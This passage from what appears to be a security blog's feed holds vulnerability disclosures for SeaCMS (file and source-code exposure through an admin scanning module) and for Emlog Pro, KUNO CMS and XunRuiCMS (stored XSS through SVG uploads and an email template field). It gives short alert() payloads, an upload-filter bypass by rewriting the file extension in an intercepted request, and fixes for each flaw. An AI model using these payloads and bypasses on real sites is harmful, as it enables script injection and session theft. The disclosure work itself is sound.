    <content type="html"><![CDATA[<h1 id="Information-Disclosure-and-Source-Code-Leakage-Vulnerability-in-SeaCMS"><a href="#Information-Disclosure-and-Source-Code-Leakage-Vulnerability-in-SeaCMS" class="headerlink" title="Information Disclosure and Source Code Leakage Vulnerability in SeaCMS"></a>Information Disclosure and Source Code Leakage Vulnerability in SeaCMS</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A critical information disclosure vulnerability has been discovered in SeaCMS version 13.1. The vulnerability exists in the <code>admin_safe.php</code> component located in the <code>/btcoan/</code> directory. This security flaw allows authenticated administrators to scan and download not only the application’s source code but also potentially any file accessible on the server’s root directory.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: SeaCMS</li><li><strong>Version</strong>: 13.1</li><li><strong>Component</strong>: Security Scanning Module (<code>/btcoan/admin_safe.php</code>)</li><li><strong>CWE</strong>: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed SeaCMS 13.1 locally using PHPStudy with the access URL <a href="http://seacms.local/btcoan/#">http://seacms.local/btcoan/#</a>. The source code is available at: <a href="https://github.com/seacms-net/CMS">https://github.com/seacms-net/CMS</a></p><p>During security analysis of the administrative interface, I discovered that the security scanning component (<code>admin_safe.php</code>) intended to identify potentially vulnerable files actually exposes the full file content and allows direct download of source code files.</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-21%20163737.png" alt="Security Scanning Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After accessing the admin panel and navigating to the security scanning module, I clicked on “Start Scanning” and observed that the system not only identified files but also provided direct download links to their source code:</p><p><img src="/img/image-20250821164151353.png" alt="Source Code Download Options"></p><p>This functionality results in complete exposure of the application’s source code:</p><p><img src="/img/image-20250821164227307.png" alt="Source Code Exposure"></p><p>More critically, the scanning functionality is not properly confined to the application directory. It can traverse and expose files from the entire server root directory, including other applications and potentially sensitive files:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-21%20164410.png" alt="Directory Traversal and Server-wide Access"></p><p>As demonstrated in the testing environment, this vulnerability allows access to all files within the PHPStudy installation directory, enabling the download of source code from any application hosted on the same server.</p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the security scanning component (<code>admin_safe.php</code>), which fails to:</p><ol><li>Properly restrict file access to the application’s directory</li><li>Implement authorization checks for file downloads</li><li>Sanitize file paths to prevent directory traversal</li><li>Restrict access to sensitive application files and configurations</li></ol><p>The core issue appears to be that the security scanning feature, intended to identify security issues, itself becomes a security liability by exposing source code and enabling unrestricted access to server files.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Download the entire application source code, exposing business logic, security mechanisms, and potential hardcoded credentials</li><li>Access configuration files that might contain database credentials, API keys, and other sensitive information</li><li>Access files from other applications hosted on the same server</li><li>Gain insights that could facilitate further attacks by understanding the application’s security mechanisms</li></ol><p>While this vulnerability requires administrative access to exploit, it represents a critical security issue as it completely compromises the confidentiality of the application’s source code and potentially exposes other sensitive server information.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should:</p><ol><li>Restrict file scanning to only display metadata (file names, sizes, permissions) without providing content access</li><li>Implement proper directory isolation to prevent access to files outside the application’s directory</li><li>Add additional authorization checks for security scanning features</li><li>Add logging and monitoring for sensitive administrative operations</li><li>Consider removing or significantly restricting the file download capability from the security scanning module</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-21</strong>: Vulnerability discovered</li><li><strong>2025-08-21</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>Information Disclosure</tag>
      
      <tag>Source Code Leakage</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in Emlog Pro via SVG File Upload</title>
    <link href="/2025/08/21/SVG-File-Upload-XSS-Vulnerability-in-Emlog-Pro/"/>
    <url>/2025/08/21/SVG-File-Upload-XSS-Vulnerability-in-Emlog-Pro/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-Emlog-Pro-via-SVG-File-Upload"><a href="#Stored-XSS-Vulnerability-in-Emlog-Pro-via-SVG-File-Upload" class="headerlink" title="Stored XSS Vulnerability in Emlog Pro via SVG File Upload"></a>Stored XSS Vulnerability in Emlog Pro via SVG File Upload</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in Emlog Pro 2.5.19. The vulnerability exists due to insufficient validation of SVG file uploads in the <code>/admin/media.php</code> component, allowing attackers to upload malicious SVG files containing JavaScript code that executes when the uploaded file is viewed.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: Emlog Pro</li><li><strong>Version</strong>: 2.5.19</li><li><strong>Component</strong>: Media Upload Functionality (<code>/admin/media.php</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed the latest version of Emlog Pro 2.5.19 locally using PHPStudy. The source code is available at: <a href="https://www.emlog.net/download">https://www.emlog.net/download</a></p><p>During security analysis of the administrative interface, I discovered that the media upload component allows SVG files to be uploaded without proper validation or sanitization. This creates a vector for stored XSS attacks through malicious SVG content.</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-21%20155306.png" alt="Media Upload Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After identifying the vulnerability in the media upload component, I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS测试&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The SVG file was successfully uploaded without any security checks:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-21%20155546.png" alt="Successful Upload Confirmation"></p><p>When accessing the uploaded SVG file URL, the JavaScript code is executed in the browser context:</p><p><img src="/img/image-20250821155704544.png" alt="XSS Execution Proof"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the media upload component, which fails to properly validate and sanitize SVG file uploads before storing them on the server. The application has several critical security issues:</p><ol><li>No content validation for SVG files</li><li>No sanitization of potentially dangerous SVG elements and attributes</li><li>SVG files are served with the correct MIME type that allows JavaScript execution</li><li>Absence of Content Security Policy (CSP) to restrict script execution in uploaded media</li></ol><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform actions on behalf of the victim</li><li>Potentially escalate to more severe attacks if combined with other vulnerabilities</li></ol><p>While this vulnerability requires administrative access to exploit, it can be used as part of a chain attack where a lower-privileged user gains administrative access and then leverages this vulnerability to maintain persistence or escalate privileges further.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should:</p><ol><li>Implement proper validation and sanitization of SVG files</li><li>Strip potentially dangerous elements and attributes from SVG files</li><li>Consider converting SVG files to other image formats (like PNG) during upload</li><li>Implement a Content Security Policy (CSP) to prevent execution of inline scripts</li><li>Serve uploaded SVG files with a MIME type that prevents script execution</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-21</strong>: Vulnerability discovered</li><li><strong>2025-08-21</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in Emlog Pro via HTML Injection</title>
    <link href="/2025/08/21/Stored-XSS-Vulnerability-in-Emlog-Pro-HTML-Injection/"/>
    <url>/2025/08/21/Stored-XSS-Vulnerability-in-Emlog-Pro-HTML-Injection/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-Emlog-Pro-via-HTML-Injection"><a href="#Stored-XSS-Vulnerability-in-Emlog-Pro-via-HTML-Injection" class="headerlink" title="Stored XSS Vulnerability in Emlog Pro via HTML Injection"></a>Stored XSS Vulnerability in Emlog Pro via HTML Injection</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in Emlog Pro 2.5.19. The vulnerability exists in the email template configuration component located at <code>/admin/setting.php?action=mail</code>, which allows administrators to input HTML code that is not properly sanitized, leading to persistent JavaScript execution.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: Emlog Pro</li><li><strong>Version</strong>: 2.5.19</li><li><strong>Component</strong>: Email Template Configuration (<code>/admin/setting.php?action=mail</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed the latest version of Emlog Pro 2.5.19 locally using PHPStudy. The source code is available at: <a href="https://www.emlog.net/download">https://www.emlog.net/download</a></p><p>During security analysis of the administrative interface, I discovered that the email template configuration page allows direct HTML input without proper sanitization or validation. This creates an entry point for stored XSS attacks.</p><p><img src="/img/image-20250821160121933.png" alt="Email Template Configuration Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After identifying the vulnerability in the email template component, I injected the following malicious HTML code:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Upon insertion of this code, the JavaScript is immediately executed in the browser:</p><p><img src="/img/image-20250821160253388.png" alt="XSS Execution Proof"></p><p>After saving the settings, the malicious code is stored in the database:</p><p><img src="/img/image-20250821160413692.png" alt="Saving Malicious Configuration"></p><p>Subsequently, every time the email template configuration page is accessed, the XSS payload is automatically triggered:</p><p><img src="/img/image-20250821160455751.png" alt="Persistent XSS Execution"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the email template configuration component, which fails to properly sanitize user-supplied HTML input before storing it in the database and rendering it back to users. The application has several critical security issues:</p><ol><li>No input validation for HTML content in the email template field</li><li>No sanitization of potentially dangerous HTML attributes and event handlers</li><li>Absence of Content Security Policy (CSP) to restrict script execution</li><li>Direct storage and rendering of user-supplied HTML without encoding</li></ol><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other administrators’ browsers</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform unauthorized actions on behalf of victim administrators</li><li>Potentially escalate to more severe attacks or system compromise</li></ol><p>While this vulnerability requires administrative access to exploit, it can be used as part of a chain attack where a lower-privileged user gains administrative access and then leverages this vulnerability to maintain persistence or escalate privileges further.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should:</p><ol><li>Implement proper HTML sanitization for the email template input</li><li>Strip or encode potentially dangerous HTML attributes and event handlers</li><li>Implement a Content Security Policy (CSP) to prevent execution of inline scripts</li><li>Consider using a template system that automatically escapes HTML content</li><li>Validate user input against a whitelist of allowed HTML tags and attributes</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-21</strong>: Vulnerability discovered</li><li><strong>2025-08-21</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KUNO CMS - Stored XSS via SVG File Upload Vulnerability</title>
    <link href="/2025/08/19/KUNO-File-Upload-XSS-Vulnerability/"/>
    <url>/2025/08/19/KUNO-File-Upload-XSS-Vulnerability/</url>
    
    <content type="html"><![CDATA[<h1 id="KUNO-CMS-Stored-XSS-via-SVG-File-Upload-Vulnerability"><a href="#KUNO-CMS-Stored-XSS-via-SVG-File-Upload-Vulnerability" class="headerlink" title="KUNO CMS - Stored XSS via SVG File Upload Vulnerability"></a>KUNO CMS - Stored XSS via SVG File Upload Vulnerability</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in KUNO CMS (2025 latest version). The vulnerability exists due to insufficient validation of file uploads in the <code>backend/internal/api/media.go</code> component, allowing attackers to upload SVG files containing malicious JavaScript code that executes when the uploaded file is viewed.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: KUNO CMS</li><li><strong>Version</strong>: 2025 Latest Version</li><li><strong>Component</strong>: <code>backend/internal/api/media.go</code> (File Upload Functionality)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed KUNO CMS locally using Docker with the following method:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. Create a dedicated directory (recommended to use /opt)</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /opt/kuno<br><span class="hljs-built_in">cd</span> /opt/kuno<br><br><span class="hljs-comment"># 2. Download and execute the deployment script</span><br>curl -sSL <span class="hljs-string">&quot;https://raw.githubusercontent.com/xuemian168/kuno/main/deploy-from-hub.sh?<span class="hljs-subst">$(date +%s)</span>&quot;</span> -o deploy.sh &amp;&amp; <span class="hljs-built_in">chmod</span> +x deploy.sh &amp;&amp; <span class="hljs-built_in">sudo</span> ./deploy.sh<br></code></pre></td></tr></table></figure><p>The source code is available at: <a href="https://github.com/xuemian168/kuno">https://github.com/xuemian168/kuno</a></p><p>During code analysis of the <code>backend/internal/api/media.go</code> component, I discovered several security issues:</p><ul><li>File type validation is based solely on Content-Type headers, which can be easily bypassed</li><li>No analysis of file contents is performed</li><li>No whitelist of allowed file extensions is implemented</li></ul><p><img src="/img/image-20250819112357386.png" alt="Code Analysis"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After identifying the vulnerability in the frontend interface:</p><p><img src="/img/image-20250819112547737.png" alt="Upload Interface"></p><p>I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS Test&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The attack methodology involved:</p><ol><li>Saving the SVG code as a PNG file to bypass frontend validation</li><li>Intercepting the upload request with a proxy tool</li><li>Modifying the file extension from PNG to SVG before sending the request</li></ol><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-19%20103042.png" alt="Request Interception"></p><ol start="4"><li>Changing the file extension to SVG in the request</li></ol><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-19%20103001.png" alt="Modified Request"></p><ol start="5"><li>When accessing the uploaded file URL, the JavaScript code is executed in the browser:</li></ol><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-19%20102939.png" alt="XSS Execution"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the <code>backend/internal/api/media.go</code> component, which fails to properly validate uploaded files. The component has several critical security issues:</p><ol><li>It only checks the Content-Type header, which can be easily spoofed</li><li>It does not perform content analysis to detect potentially malicious code in SVG files</li><li>It lacks a proper file extension whitelist</li><li>It does not sanitize SVG content before accepting the upload</li></ol><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers</li><li>Steal sensitive information such as session cookies</li><li>Perform actions on behalf of the victim</li><li>Potentially escalate to more severe attacks</li></ol><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should:</p><ol><li>Implement proper validation and sanitization of SVG files in the <code>media.go</code> component</li><li>Perform content analysis to detect potentially malicious code</li><li>Establish a whitelist of allowed file extensions</li><li>Consider using a Content Security Policy (CSP) to prevent execution of inline scripts</li><li>Convert SVG files to other image formats (like PNG) during the upload process</li><li>Apply SVG-specific sanitization to remove potentially dangerous attributes and elements</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-19</strong>: Vulnerability discovered</li><li><strong>2025-08-19</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XunRuiCMS v4.7.1 - Stored XSS via SVG File Upload</title>
    <link href="/2025/08/18/File-Upload-to-Achieve-Stored-XSS-Attack/"/>
    <url>/2025/08/18/File-Upload-to-Achieve-Stored-XSS-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="XunRuiCMS-v4-7-1-Stored-XSS-via-SVG-File-Upload"><a href="#XunRuiCMS-v4-7-1-Stored-XSS-via-SVG-File-Upload" class="headerlink" title="XunRuiCMS v4.7.1 - Stored XSS via SVG File Upload"></a>XunRuiCMS v4.7.1 - Stored XSS via SVG File Upload</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in XunRuiCMS version 4.7.1. The vulnerability exists due to insufficient validation of SVG file uploads in the <code>dayrui/Fcms/Library/Upload.php</code> component, allowing attackers to inject malicious JavaScript code that executes when the uploaded file is viewed.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: XunRuiCMS</li><li><strong>Version</strong>: 4.7.1</li><li><strong>Component</strong>: <code>dayrui/Fcms/Library/Upload.php</code> (File Upload Functionality)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I built XunRuiCMS locally using the source code from GitHub. Here is the source code address:</p><p><a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p><p>This is the latest XunRuiCMS v4.7.1 version, which I deployed locally using PHPStudy at <a href="http://xunrui.local/admin0d8821d43d68.php">http://xunrui.local/admin0d8821d43d68.php</a></p><p><img src="/img/image-20250818144106220.png" alt="CMS Login Page"></p><p>During code analysis, I discovered that the application’s upload component (<code>dayrui/Fcms/Library/Upload.php</code>) allows SVG image uploads. While the system filters out the <code>&lt;script&gt;</code> tag, it does not properly sanitize other potential XSS vectors within SVG files, such as event handlers like <code>onerror</code>.</p><p><img src="/img/image-20250818144236219.png" alt="Code Filtering"></p><p>The vulnerability occurs because the upload validation routine only checks for explicit <code>&lt;script&gt;</code> tags but fails to validate other JavaScript execution vectors commonly found in SVG files, such as event handlers and embedded JavaScript URIs.</p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>The following SVG code can be used to bypass the filtering mechanism in the Upload.php component:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS Test&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Save the code above as an SVG image file:</p><p><img src="/img/image-20250818144602694.png" alt="SVG File"></p><p>The vulnerability can be exploited through the image upload functionality:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-18%20144753.png" alt="Vulnerability Point"></p><p>After uploading the malicious SVG file, it is successfully stored on the server:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-18%20142903.png" alt="Upload Success"></p><p>The uploaded image can also be seen in the local project:</p><p><img src="/img/image-20250818144939626.png" alt="Image in Project"></p><p>When accessing the uploaded SVG file, the JavaScript code is executed in the victim’s browser:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-18%20142851.png" alt="XSS Execution"></p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers</li><li>Steal sensitive information such as session cookies</li><li>Perform actions on behalf of the victim</li><li>Potentially escalate to more severe attacks</li></ol><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the <code>dayrui/Fcms/Library/Upload.php</code> component, which fails to properly sanitize SVG files before accepting them for upload. The component only checks for explicit <code>&lt;script&gt;</code> tags but does not handle other JavaScript execution vectors like event handlers (<code>onerror</code>, <code>onload</code>, etc.) that can be used within SVG elements.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should:</p><ol><li>Implement proper validation and sanitization of SVG files in the <code>Upload.php</code> component</li><li>Consider using a Content Security Policy (CSP) to prevent execution of inline scripts</li><li>Convert SVG files to other image formats (like PNG) during the upload process</li><li>Apply SVG-specific sanitization to remove potentially dangerous attributes and elements</li><li>Update the validation routine to check for event handlers and other JavaScript execution vectors</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-18</strong>: Vulnerability discovered</li><li><strong>2025-08-18</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a></li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/script#Security_considerations">SVG Security Considerations</a></li><li><a href="https://github.com/dayrui/xunruicms">XunRuiCMS GitHub Repository</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>陇剑杯 2021 wifi-Writeup</title>
    <link href="/2025/08/17/CTF%E7%AB%9E%E8%B5%9B/MISC/%E9%99%87%E5%89%91%E6%9D%AF%202021%20wifi-Writeup/"/>
    <url>/2025/08/17/CTF%E7%AB%9E%E8%B5%9B/MISC/%E9%99%87%E5%89%91%E6%9D%AF%202021%20wifi-Writeup/</url>
    
